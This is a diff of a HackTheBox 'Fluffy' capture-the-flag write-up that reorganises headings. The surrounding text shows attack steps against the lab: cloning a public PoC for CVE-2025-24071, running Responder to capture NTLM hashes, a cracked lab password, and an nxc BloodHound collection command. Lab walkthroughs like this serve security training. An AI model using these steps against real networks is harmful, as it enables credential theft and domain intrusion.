@@ -224,6 +224,9 @@ In this the Overview was quite amusing:
 NSFOCUS CERT has detected that Microsoft recently released a security update to address a critical spoofing vulnerability in Windows File Explorer, identified as **CVE-2025-24071**. This vulnerability has a CVSS score of 7.5, indicating its severity. The issue arises from the implicit trust and automatic file parsing behavior of `.library-ms` files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash. PoC (Proof of Concept) exploits for this vulnerability are now publicly available, making it a current threat. Affected users are strongly advised to apply the patch immediately to mitigate the risk.
 ```
 It says that this vulnerability is of windows explorer that is using `implicit trust and automatic file parsing` means that if we upload the zip to the server and unzip it, it will automatically execute it lets try that.
+
+### Exploitation
+ #### Initial Foothold
 ```bash
 git clone https://github.com/ThemeHackers/CVE-2025-24071
 cd CVE-2025-24071
@@ -237,7 +240,7 @@ Explaination
 -f : name of the library without extension we can see that in [[#SMB listings|Here]]
 -i : our hackthebox vpn ip or tun0 ip 
 
-#### Exploitation
+
 Now lets start our responder on tun0 or whatever your HTB vpn interface is.
 ```bash
 sudo python3 Responder.py -I tun0 
@@ -355,6 +358,8 @@ And we got the password for the user p.agila
 prometheusx-303
 ```
 
+
+#### Bloodhound
 Even after getting the user and pass we cant get a working shell but what we can do now is collect the data about the AD environment using any bloodhound ingestor , here i am using nxc but you can use anything you like just make sure it is compatible with your bloodhound
 ```bash
 nxc ldap fluffy.htb -u p.agila -p prometheusx-303 --bloodhound --collection All --dns-server 10.10.11.69
@@ -383,7 +388,6 @@ Click on Upload Files and select the bloodhound.zip file
 ![[Fluffy-04.png]]
 It will take some time roughly a min (depends on your system) to ingest the file
 
-### Bloodhound
 Now in bloodhound you can see the user p.agila on explore page --> search nodes --> p.agila --> enter 
 ![[Fluffy-05.png]]
 Click on the Profile icon and on the right side you can see the details about the user
@@ -397,3 +401,4 @@ Now we have 3 Users
 	1. CA_SVC
 	2. LDAP_SVC
 	3. WINRM_SVC
+#### Shadow Credential Attack
